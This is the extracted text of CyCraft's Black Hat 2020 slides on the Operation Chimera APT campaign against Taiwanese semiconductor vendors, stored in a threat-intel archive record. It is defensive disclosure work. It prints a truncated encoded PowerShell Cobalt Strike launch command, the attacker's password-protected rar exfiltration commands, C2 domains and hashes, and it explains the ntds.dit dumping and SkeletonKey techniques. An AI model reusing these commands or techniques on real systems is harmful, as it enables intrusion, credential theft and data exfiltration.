{
    "id": "f6c56986-e55a-4b76-b533-f98e028cadcb",
    "created_at": "2022-10-25T16:48:19.997664Z",
    "updated_at": "2025-03-27T02:14:02.452666Z",
    "deleted_at": null,
    "sha1_hash": "c18d3a77b57b75a9f941ee88e8267120b9465f07",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-08-04T01:50:56Z",
    "file_modification_date": "2020-08-05T13:33:29Z",
    "file_size": 4432472,
    "plain_text": "##### Operation Chimera - APT Operation Targets Semiconductor Vendors\n\n###### C h u n g - K u a n C h e n , I n n d y L i n , S h a n g - D e J i a n g\n\n\n-----\n\n###### Whoami\n C.K Chen\n ► Senior Researcher at CyCraft\n ► Retired CTF Player – BambooFox Founder\n ► HITCON/HITB Review Board\n ► CHROOT member\n\n SHANG-DE Jiang Inndy Lin\n ► Security Researcher at CyCraft ► Security Researcher at CyCraft\n ► UCCU Hacker Co-Founder ► Reverse Engineering Hobbyist\n\n\n-----\n\n#### CyCraft\n\n###### CyCraft is an AI company that forges the future of cybersecurity resilience through autonomous systems and human-AI collaboration.\n\n\n-----\n\n#### CyCraft in MITRE ATT&CK Evaluation\n\n###### CyCraft Takes Significant Alerting Lead in MITRE ATT&CK® Evaluations’ Latest Round\n\n\n-----\n\n#### Outline\n\n###### • Introduction\n • Case Study\n\n • A Company\n • B Company\n • Threat Actor's Digital Arsenal\n • Conclusion\n\n\n-----\n\n#### Critical Incidents in Taiwan s Supply Chain/Critical Infrastructure\n\n###### TSMC Ransomware ASUS Supply Chain Attack ColdLock against CPC\n\n\n-----\n\n#### Taiwan s Importance in the Semiconductor Landscape\n\n###### ► With decades of development, Taiwan has established itself as a leading player in the semiconductor industry. Some of the well-known leaders include TSMC and MTK\n\n • “Taiwan is set to become the largest and fastest-growing semiconductor equipment maker in the world by increasing by 21.1 percent to reach US$12.31 billion.” -Taiwan News, July 2019\n\n\n-----\n\n#### Cyberattack to semiconductor vendors\n\n###### v Just like the TSMC ransomware, a cyberattack against semiconductor could potentially\n\n v Seriously impact Taiwan’s economy v Affect the entire global supply chain\n\n v In this report, we will show how IT attacks on semiconductor vendors can be just as dangerous as an OT attack. v Attack to OT - production line halt, immediately damage v Attack to IT - leak important intelligence property, long-term damage\n\n\n-----\n\n#### Large-scale APT attacks on Semiconductor Industry\n\n###### Vendors located at the Hsinchu Science Park(HSP) were targeted\n\n Between 2018 and 2019, we discovered several attacks on semiconductor vendors\n\n Extensive attack: > 7 semiconductor vendors were attacked\n\n After our white paper was published, the received feedback revealed that more than 7 vendors were targeted by the same threat actor\n\n Not a single point attack, but an attack on the entire industry surface\n\n The APT attacks on the important vendors were precise and well-coordinated. Aside from the vendors themselves, their subsidiaries, and competitors were all targeted\n\n\n-----\n\n#### Group Chimera\n\n###### ►As the activities, attack techniques, and tactics were similar, we believe this was the work of the same threat actor\n ►Target: Semiconductor Vendors\n ►Malware: Merged different Open Source Tools (Dumpert and Mimikatz , CobaltStrike)\n ►C2: C2 hosted in Public Cloud (Google App Engine, Azure)\n ►Goal: Steal Documents, Source code, SDK of chip related projects\n\n\n-----\n\n|Col1|Col2|Col3|\n|---|---|---|\n\n|Col1|Col2|\n|---|---|\n|||\n\n|Col1|Col2|Col3|\n|---|---|---|\n||Total Endpoints Analyzed: 30k||\n\n\n#### Investigation Overview\n\n###### Investigation Period: Investigated Vendors: Total Endpoints Analyzed: 2018~2019 3+ 30k\n\n\n-----\n\n#### Today's Case Study\n\n###### Ø The three vendors involved in the analysis currently have a leading global position in their own market segments\n\n Ø Due to the different investigation time points, the analytical perspective of the attack campaign was different\n\n A Company B Company C Company\n\n • Our long-term partner. The long- • One-time IR service. When the • Long-term partner with high term monitoring allowed more investigation started, it was security capacity. details of the attacker's activities already a long time after the • Help us to deep investigate, get a to be revealed. attacks happened.  lot feedback from them\n • The detailed information enabled • Highlighted the threat actor’s • Give us more information to us to track the root cause. long-term activities and what data illustrate threat actors\n\n\n-----\n\n###### Non-representative. Only for illustration purposes In the following slides, every machine and username are de-identified, not original names\n\n\n-----\n\n## A Company\n\n\n-----\n\n#### Case A: Overview\n\n###### Ø Activity date: 2019/12/09 ~ 2019/12/10\n\n Ø 15 endpoints and 6 user accounts were compromised\n\n Ø Note that all the names are de-identified \n\n Ø Four malwares and eight C2 servers were found\n\n\n-----\n\n#### Cobalt Strike\n\n###### ►Disguised Cobalt Strike beacon as Google Update.exe\n\n ►VT search found nothing\n ►Injected payloads into other processes\n ►Found in two endpoints: Server-LAUREN & PC-SHENNA\n\n\n-----\n\n#### Used Hosting Server for C2\n\n###### ►Network security devices had difficulty detecting the associated C2 servers, as they were in the Google Cloud Platform.\n\n ►Created backdoor which was disguised as Google Update.\n ►Other cloud hosting services were also abused\n\n\n-----\n\n#### Root Cause Analysis - PC-SHENNA\n\n###### ►With our Timeline Analysis, we found that the backdoor in PC-SHENNA was implanted from Server-LAUREN\n\n Attack was launched right before employees began to get off work\n\n Server- PC- LAUREN SHENNA\n\n\n-----\n\n#### Remote Execution Tools\n\n###### Applied benign program to achieve their malicious activities\n\n schtasks WMIC\n ►The first Cobalt Strike backdoor was ►Server-LAUREN used wmic to remotely located at NB-CLAIR, and was then execute various commands in another remotely copied to Server-LAUREN endpoint to check if there was an\n Internet connection\n\n ►A valid account was used to invoke Cobalt Strike via schtasks\n\n\n-----\n\n#### Root Cause Analysis - Server-LAUREN\n\n###### ►Due to our new findings, additional information could be added to our\n Server-\n investigation graph\n SHANAE\n\n Server- PC-SHENNA LAUREN\n\n Server- MELINA\n\n\n-----\n\n#### Root Cause Analysis - Server-LAUREN\n\n###### ►Server-LAUREN remotely used an archive tool to collect registry and ntds.dit in Server-MELINA(DC) for offline breaking\n\n\n-----\n\n#### NTDS.DIT Explanation\n\n###### ►Active Directory data was stored in the ntds.dit ESE database file. Two copies of\n ntds.dit were present in separate locations on a given domain controller.\n\n ►%SystemRoot%\\NTDS\\ntds.dit\n ►%SystemRoot%\\System32\\ntds.dit\n\n ntds.dit is the AD database, containing domain hosts and users information(e.g. ID, name, email and password). As ntds.dit was encrypted, and the key was stored I the SYSTEM registry, the adversary also needed to make a copy of the registry data.\n\n\n-----\n\n#### Root Cause Analysis - NB-CLAIR\n\n###### ►Through correlation analysis, our AI investigation Server- showed that NB-CLAIR used Schedule Task to place SHANAE malware to the schedule tasks of Server-LAUREN\n\n wmic\n\n schtasks\n schtasks\n Server- PC-\n NB-CLAIR\n LAUREN SHENNA\n\n schtasks\n\n Server- MELINA\n\n\n-----\n\n#### Root Cause Analysis - NB-CLAIR\n\n###### ►In the NB-CLAIR timeline, we discovered six minutes before the scheduled task execution, IP1 used RDP and User-01 to make a successful login\n\n ►This is highly likely to be the root cause of the attack\n\n\n-----\n\n#### Recon\n\n###### ►Several \"net user\" commands were executed for recon purposes, and the results were saved to the RecordedTV_lib.log\n\n\n-----\n\n#### Data Exfiltration\n\n###### ►RECORDEDTV.MS was used to archive the stolen data for data exfiltration\n\n ►Identical binaries were found in several machines, but under different names, e.g. RECORDEDTV.MS, uncheck.dmp, and jucheck.exe\n ►RAR software, had a one-byte discrepancy from the original version\n ►The same file was also found on other machines. Thus, it is likely to have been used in past attacks\n ►Inserting malware in a location, where legal software is stored, seems to be a characteristic tactic of Operation Chimera\n\n\n-----\n\n#### Root Cause Analysis– IP1\n\n###### ►IP1 is a unscanned host and related to many accounts. It could be a shared machine or a VPN host\n ►VPN can also be compromised. Never use VPN as your only line of defense\n\n\n-----\n\n### B Company\n\n\n-----\n\n|Time Period|# of Event|# of compromised endpoints|# of data leaks|# of malware|\n|---|---|---|---|---|\n|2018/8/7 ~ 2019/12/11|140k+|14|9|10|\n\n\n#### B Company : Overview\n\n###### • Investigation Reason\n\n B has business C discovers\n B&C create a\n B company cooperation anomaly Asks us to\n bridge between\n compromise with C activities from investigate\n their networks\n company B\n\n • Statistic Summary\n\n Time Period # of Event # of compromised endpoints # of data leaks # of malware\n\n 2018/8/7 ~ 2019/12/11 140k+ 14 9 10\n\n\n-----\n\n#### Powershell\n\n###### ►Fileless ►The powershell script executed a\n\n ►10 endpoints, which included two Cobalt Strike backdoor and was used domain controllers for process migration to other system\n processes svchost.exe\n\n powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwB uAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAE EAQQBBAEEAQQBLAFYAVwBiAFcALwBpAE8AQgBEACsAMwBQAHcASwBYADQAVgAwAG8ASgBaADMAdABnAHQAZABWAFYAb wBuAFEAQQBrAGwAbABKAGMAVwAyAGsAWABWAHkAUwBRAG0AdQBEAGcASgBkAFoAeQBtAGQATABmAC8ALwBTAFkAdgA1 AEoAYgAyAGIAawArADYAaQB4AFEAbABuAHMAdwA4AE0AOAA5ADQAUABKAE0AcABsAGMAVwBwAEYATQB5AFUAaABtAGQ AUgBWAEoAeABSADQAVABQ\n\n\n-----\n\n#### APT Attack\n\n###### ►Cobalt Strike was used to inject the malware into the system, enabling the attacker to access the system and communicate with a C2\n\n ►C2: striking-pipe-253603.appspot.com, 172.217.27.148:443, msplatform- updates.azureedge.net, chrome- applatses.appspot.com\n\n\n-----\n\n#### Cyber Situation Graph\n\n###### v Company already seriously hacked\n\n v Difficult to manually investigate, needed help from A.I.\n\n\n-----\n\n###### ❖ 2018.11\n\n ❖ 2019.03\n Hacker returns on a quarterly basis to collect new data.\n ❖ 2019.06\n\n ❖ 2019.09\n\n\n-----\n\n###### ❖ 2019.12, Harvest new endpoints\n\n\n-----\n\n#### Archive Password\n\n###### ►The actor also used a RAR program with innocuous file names, such as RecordedTV.ms,\n c:\\users\\xxxx\\libraries\\RecordedTV.ms a -m5 - v71m –hpf**kyou.google.com11 vmlum-vss.log jucheck.exe and vmware.log to vmlum-vmvss.log archive and steal the data of C:\\Windows\\system32\\cmd.exe /C interest c:\\users\\xxxxxx\\libraries\\RecordedTV.ms a -m5 -r\n\n ► A similar scheme was utilized by\n –hpf**kyou.google.com11 vmlum-vmopt.log\n the attacker to archive the\n “\\\\<Hostname>\\personal\\<Username>\\<Product>- Traning-v1.1.pptx\" > vmlumss.log & dir vmlum- passwords they used vmopt*\n\n\n-----\n\n#### Leaked File Name\n\n###### ►During our investigation, we made an inventory of the leaked data. Some of the data is shown below:\n\n \\\\Users\\<Account>\\Project\\Roadmap \\\\Users\\<Account>\\Backup\\Workspace \\\\Users\\<Account>\\chip and SDK setting \\\\Users\\<Account>\\<Productname> SDK Installation guide.pdf\n\n ►Attacker's intent was stealing intelligence property\n ►Business spy? State-sponsor attack to benefit a certain industry?\n\n\n-----\n\n## C Company\n\n\n-----\n\n#### Utilize Cloud Storage\n\n###### Ø Exfiltration Tool: 3 in 1 Cloud-Storage Tool (GDrive, Dropbox, OneDrive) Ø MD5: Ø V1: be16e6cf8cc63415a1c77a59fa43deba (no record in VT) Ø V2: 4d5440282b69453f4eb6232a1689dd4a (onedrive.exe) Ø Use Cloud-based Storage Web API to transfer file -> able to bypass L7 firewall\n\n Ø Exfiltration Tool: another Cloud-Storage Tool (Openload Free Space)\n\n Ø C# Program\n\n\n-----\n\n#### 3 in 1 Cloud-based Storage Transfer Tool\n\n###### Storage auth Token Uploaded File Path Type\n\n\n-----\n\n#### Profile of the Campaign\n\n###### Ø Language - Simplified Chinese\n\n\n-----\n\n#### Profile of the Campaign\n\n###### Chimera Campaign has at least one member understanding Chinese v Language - Simplified Chinese\n\n\n-----\n\n#### Profile of the Campaign\n\n###### v Hacker Active Timeline(2019) v Working hours v 8:30 - 12:30 to 13:30 – 20:30 (UTC +8)\n\n v Working days\n v Mon. ~ Fri. ß Normal Time v Wed. ß most busy v Sat. ß Event Driven overtime\n\n The campapaign is at the same timezone to TW (UTC+8)\n\n\n-----\n\n## Actors' Digital Arsenal\n\n\n-----\n\n#### Actors' Digital Arsenal\n\n###### ►Cobalt Strike Beacon\n ►WinRAR\n ►SkeletonKey Injector\n ►Winnti Backdoor\n\n\n-----\n\n# Cobalt Strike Beacon\n\n\n-----\n\n#### Cobalt Strike Beacon\n\n###### ►Cobalt Strike Beacon was used as main backdoor\n ►Overwrite GoogleUpdate.exe for persistency\n ►Identical file was discovered in 3+ companies\n ►C2\n\n ► chrome-applatnohp.appspot.com\n ► ussdns04.heketwe.com\n ► ussdns02.heketwe.com\n ► ussdns01.heketwe.com\n\n\n-----\n\n#### Suspicious R-W-X Memory\n\n###### ►Our product detected suspicious memory block\n\n\n-----\n\n#### Hybrid Payload: PE as Shellcode\n\n###### ►\"MZ\" signature can be decoded as \"pop r10\" under x64 architecture\n\n ►\"dec ebp; pop edx\" under x86 architecture\n ►At offset 0x1791c is a shellcode-like function called \"reflective loader\"\n ►0x56A2B5F0 is the hash value of \"ExitProcess\"\n\n Locate address of itself, and use it as first argument (rdi)\n\n Compute address of reflective loader and execute it\n\n\n-----\n\n###### Injection Strategy: Named Pipe\n\n Execute\n\n Malicious Process Stager Shellcode Real Payload\n Execute\n\n Spawn\n\n CobaltStrike Target Process Beacon Module\n\n\n-----\n\n# WinRAR\n\n\n-----\n\n#### WinRAR\n\n###### ►They use rar.exe to compress and encrypt the files to be stole\n ►There's a folder named \"RecordedTV.library-ms\" under same path\n\n\n-----\n\n#### Mutated rar.exe\n\n###### ►The file was uploaded to VirusTotal in 2009\n ►It's rar.exe from WinRAR 3.60b8 but different from original one\n\n ►Only 1byte was different, but we've confirmed that was not a crack\n ►This patch may cause the program crash\n ►Hypothesis 1: Change file hash to avoid detection\n ►Hypothesis 2: Bit flip during copy\n\n Disassembly of patch Patch diff (before / after)\n\n\n-----\n\n# SkeletonKey Injector\n\n\n-----\n\n#### SkeletonKey Injector\n\n###### ►A new malware combined \"dumpert\" and \"mimikatz\"\n\n ►\"mimikatz\" is a well-known hacking tool\n l Most people use it to dump Windows credentials, but its capability is more than that\n ►\"dumpert\" is a tool to dump lsass.exe memory stealthily\n\n\n-----\n\n#### Dumpert\n\n###### ►Made by a security company called Outflank\n ►Dump lsass.exe stealthy via direct system call\n\n ►Windows system call numbers changed from release to release\n ►DLL export function is the only stable interface\n ►That's why Windows shellcode always needs to locate DLLs in memory\n\n\n-----\n\n#### Dumpert: Implementation\n\n###### ►Use ntdll!RtlGetVerion to determine Windows version\n ►Load different syscall function for different version\n ►Bypass any user-space hook\n\n\n-----\n\n#### SkeletonKey\n\n###### ►APT malware discovered by DELL Secureworks in 2015\n ►Implants a backdoor password to domain controller\n\n ►The original password was still valid, wrong password still got rejected\n ►Inject code into lsass.exe process to alter authentication routine\n\n\n-----\n\n#### Impact of SkeletonKey Injector\n\n###### ►No need to use administrator credentials for lateral movement\n ►It leaves nearly no clue, only logon success events\n ►You must reboot domain controller to clean the SkeletonKey\n\n ►We've observed some other attack that using modified mimikatz\n\n\n-----\n\n# Winnti Backdoor\n\n\n-----\n\n#### Strange Network Tool: baseClient.exe\n\n###### ►We thought that was a network probing tool\n\n\n-----\n\n#### Winnti Backdoor\n\n###### ►We thought baseClient.exe in our public report was a network probing tool\n\n ►It's actually Winnti backdoor\n\n\n-----\n\n# Other APT Events in Taiwan\n\n\n-----\n\n#### ColdLock Ransomware\n\n###### ►Taiwan's national gasoline company was hit by ransomware\n ►ColdLock was based on an open-source ransomware: EDA2\n ►Ministry of Justice Investigation Bureau said the attack was related to Winnti group\n\n\n-----\n\n#### SkeletonKey Attack in Taiwan\n\n###### ►Serval attacks against Taiwan government agencies used SkeletonKey\n ►Modified version of mimikatz executed file-lessly\n\n When OpenProcess failed, it will load mimikatz driver to unprotect lsass.exe and try again.\n\n\n-----\n\n#### Take Away\n\n###### ►Disclosure a large-scale APT attacks targeting semiconductor; more than 7 vendors are compromised.\n ►Precisely attacks. Targets leading semiconductor vendors, their subsidiaries, partners and competitors.\n ►Their goals is stealing intelligence property(documents, source code, SDK of chip related projects). Make long-term damage to the victim.\n\n\n-----\n\n#### Take Away\n\n###### ►Attackers utilize varies open source, general tools to make attribution harder.\n ►In 2 shared case studies, AD & VPN are compromised. Enterprises should consider resilience of IT systems. Avoid relying on a single security service.\n ►A rarely used SkeletonKey technique is used, which makes adversaries login like normal user. - Persistence, Defense Evasion.  \n ►No system is safe. Regularly threat hunting, shorten the MTTD/MTTR.\n\n\n-----\n\n# Thanks for your listening!\n\n###### Welcome to Ask Questions\n\n\n-----\n\n###### Appendix – MITRE ATT&CK and IoC\n\n\n-----\n\n|Initial Access|T1133|External Remote Services|The threat actor’s first entry point was from a VPN server, where a valid account was used. We believe the actor acquired the password from a separate data breach to login to the VPN.|\n|---|---|---|---|\n|Execution|T1047|Windows Management Instrumentation|The threat actor used wmi to remotely execute commands on another endpoint for reconnaissance, primarily checking the Internet connection availability.|\n||T1086|Powershell|The threat actor used a Cobalt Strike powershell script for process migration to other system processes. Meanwhile, BloodHound was used to assess the privilege settings in the Active Directory (AD) domain and devise attack paths.|\n||T1053|Scheduled Task|The threat actor leveraged scheduled tasks to launch APT malware to a remote system using domain controller account credentials. After the execution, the threat actor removed the scheduled task information to hide the system artifact.|\n|Defense Evasion|T1055|Process Injection|The discovered memory module showed that Cobalt Strike conducted process injection to migrate to other processes.|\n\n\n###### Tactic ID Technique Description\n\n The threat actor’s first entry point was from a VPN server, where\n Initial Access T1133 External Remote Services a valid account was used. We believe the actor acquired the\n password from a separate data breach to login to the VPN.\n\n The threat actor used wmi to remotely execute commands on\n Windows Management Execution T1047 another endpoint for reconnaissance, primarily checking the Instrumentation\n Internet connection availability.\n\n The threat actor used a Cobalt Strike powershell script for process migration to other system processes. Meanwhile,\n T1086 Powershell\n BloodHound was used to assess the privilege settings in the Active Directory (AD) domain and devise attack paths.\n\n The threat actor leveraged scheduled tasks to launch APT malware to a remote system using domain controller account\n T1053 Scheduled Task\n credentials. After the execution, the threat actor removed the scheduled task information to hide the system artifact.\n\n The discovered memory module showed that Cobalt Strike Defense Evasion T1055 Process Injection conducted process injection to migrate to other processes.\n\n\n-----\n\n|Tactic|ID|Technique|Description|\n|---|---|---|---|\n|Discovery|T1087|Account Discovery|The 'net user' commands were used to recon user information. The final results were dumped to RecordedTA_lib.log.|\n|Credential Access|T1003|Credential Dumping|NTDS from Domain Controller, threat actor collected registry and ntds.dit in other hosts from the domain controller for offline breaking. The threat actor merged code from dumpert and mimikatz to dump system credentials, which was hard to detect by security products.|\n|Persistence|T1098|Account Manipulation|The threat actor used Skeleton key to inject false credentials into domain controllers with the intent of creating a backdoor password. This stealthy technique was hard to detect.|\n|Lateral Movement|T1076|Remote Desktop Protocol|The threat actor used a valid account to remotely login to the system.|\n||T1077|Windows Admin Shares|The threat actor used windows admin share to collect and LM to remote system.|\n|Command and Control|T1102|Web Service|The threat actor widely used Google’s appspot to host their C2 servers.|\n|Exfiltration|T1532|Data Encrypted|One characteristic of the threat actor was using “fxxkyou.google[.]com” as the password to encrypt the stolen data.|\n\n\n###### The 'net user' commands were used to recon user information. The final Discovery T1087 Account Discovery\n results were dumped to RecordedTA_lib.log.\n\n NTDS from Domain Controller, threat actor collected registry and ntds.dit in other hosts from the domain controller for offline breaking. The threat\n Credential Access T1003 Credential Dumping\n actor merged code from dumpert and mimikatz to dump system credentials, which was hard to detect by security products.\n\n The threat actor used Skeleton key to inject false credentials into domain\n Account Persistence T1098 controllers with the intent of creating a backdoor password. This stealthy Manipulation\n technique was hard to detect.\n\n Remote Desktop Lateral Movement T1076 The threat actor used a valid account to remotely login to the system. Protocol\n Windows Admin The threat actor used windows admin share to collect and LM to remote T1077 Shares system.\n\n Command and Control T1102 Web Service The threat actor widely used Google’s appspot to host their C2 servers.\n\n One characteristic of the threat actor was using “fxxkyou.google[.]com” as Exfiltration T1532 Data Encrypted\n the password to encrypt the stolen data.\n\n This program was a modified RAR software, where there was a one byte T1002 Data Compressed\n inconsistency over the original version.\n\n\n-----\n\n#### Malware\n\n**Hash** **Description**\n\n**f2d4a35f20cd92c13cab8f6a50995a3b** ColbaltStrike backdoor\n\n**389d184ef0b0b2901c982c421142cbb1** ColbaltStrike backdoor\n\n**c9b8cab697f23e6ee9b1096e312e8573** Archive Tool (Greyware)\n\n**a403d96953eb867f3092751d0763c7d0** Persistence\n\n**bb897e34bc0d1e82dfe79d0898f5aa88** Persistence\n\n**be16e6cf8cc63415a1c77a59fa43deba** 3 in 1 Cloud Storage, Data Exfiltration\n\n**4d5440282b69453f4eb6232a1689dd4a** 3 in 1 Cloud Storage, Data Exfiltration\n\n**3c2447e278318c4e6b50d5095e7028e5** Event Log Dump Tool\n\n**a8559c4bcd299125036583febe1a53fb** Winnti Backdoor\n\n\n-----\n\n#### C2 Domain\n\n**chrome-applatnohp.appspot[.]com**\n\n**ussdns04.heketwe[.]com**\n\n**ussdns01.heketwe[.]com**\n\n**78276.ussdns02.heketwe[.]com**\n\n**78276.ussdns01.heketwe[.]com**\n\n\n-----\n\n#### Other Malware IoC\n\n**Hash** **Description**\n\n**234d17d8978717d33bf53015760878ea** **COLDLOCK Powershell Loader**\n\n**28991de4ef6d97b324503991adb6bc0b** **COLDLOCK .Net Malware**\n\n**7aab677263be856a668dc3d38334fcd8** **COLDLOCK Powershell Loader V2**\n\n**0998f695ddd72f1ed0f8937929f1afdd** **COLDLOCK .Net Malware V2**\n\n**7940616f980cd031d61f3d3a9d454c17** SkeletonKey Attack, msehp.dat\n\n**d770a361646a0463f597c127e0705265** SkeletonKey Attack, Windows Event Manageex.dll\n\n**3838d0f1cb10f04632a6ca7fd79c3d0d** SkeletonKey Attack, Mimikazt fileless\n\n**c3a077bc0e4095d68569817b51bea7a2** SkeletonKey Attack, WinHelp.sys\n\n**cb1f2894cd35b173140690b0a608d4b6** SkeletonKey Attack, wmipd.dll\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://i.blackhat.com/USA-20/Thursday/us-20-Chen-Operation-Chimera-APT-Operation-Targets-Semiconductor-Vendors.pdf"
    ],
    "report_names": [
        "us-20-Chen-Operation-Chimera-APT-Operation-Targets-Semiconductor-Vendors.pdf"
    ],
    "threat_actors": [
        {
            "id": "873a6c6f-a4d1-49b3-8142-4a147d4288ef",
            "created_at": "2022-10-25T16:07:23.455744Z",
            "updated_at": "2025-03-27T02:02:09.811933Z",
            "deleted_at": null,
            "main_name": "Chimera",
            "aliases": [
                "Operation Skeleton Key"
            ],
            "source_name": "ETDA:Chimera",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "SkeletonKeyInjector",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f88b16bc-df4b-48e7-ae35-f4117240ff24",
            "created_at": "2022-10-25T15:50:23.556699Z",
            "updated_at": "2025-03-27T02:00:55.499173Z",
            "deleted_at": null,
            "main_name": "Chimera",
            "aliases": [
                "Chimera"
            ],
            "source_name": "MITRE:Chimera",
            "tools": [
                "PsExec",
                "esentutl",
                "Mimikatz",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "5bbced13-72f7-40dc-8c41-dcce75bf885e",
            "created_at": "2022-10-25T15:50:23.695735Z",
            "updated_at": "2025-03-27T02:00:55.525839Z",
            "deleted_at": null,
            "main_name": "Winnti Group",
            "aliases": [
                "Winnti Group"
            ],
            "source_name": "MITRE:Winnti Group",
            "tools": [
                "PipeMon",
                "Winnti for Windows",
                "PlugX"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "945a572f-ebe3-4e2f-a288-512fe751cfa8",
            "created_at": "2022-10-25T16:07:24.413971Z",
            "updated_at": "2025-03-27T02:02:10.212853Z",
            "deleted_at": null,
            "main_name": "Winnti Group",
            "aliases": [
                "Wicked Panda",
                "Winnti Group"
            ],
            "source_name": "ETDA:Winnti Group",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "FunnySwitch",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041642,
    "ts_creation_date": 1596505856,
    "ts_modification_date": 1596634409,
    "files": {
        "pdf": "https://archive.orkl.eu/c18d3a77b57b75a9f941ee88e8267120b9465f07.pdf",
        "text": "https://archive.orkl.eu/c18d3a77b57b75a9f941ee88e8267120b9465f07.txt",
        "img": "https://archive.orkl.eu/c18d3a77b57b75a9f941ee88e8267120b9465f07.jpg"
    }
}